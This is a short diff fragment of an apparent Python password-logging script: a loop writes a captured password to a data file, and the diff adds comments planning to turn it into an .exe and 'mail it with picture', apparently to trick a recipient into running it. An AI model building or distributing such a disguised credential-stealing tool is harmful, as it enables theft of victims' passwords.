@@ -13,3 +13,8 @@ while True:
 
         data_file.write("\n")  # New line written before data is written
         data_file.write(password[0])
+
+
+# .exe file to execure
+# mail it with picture
+# ...
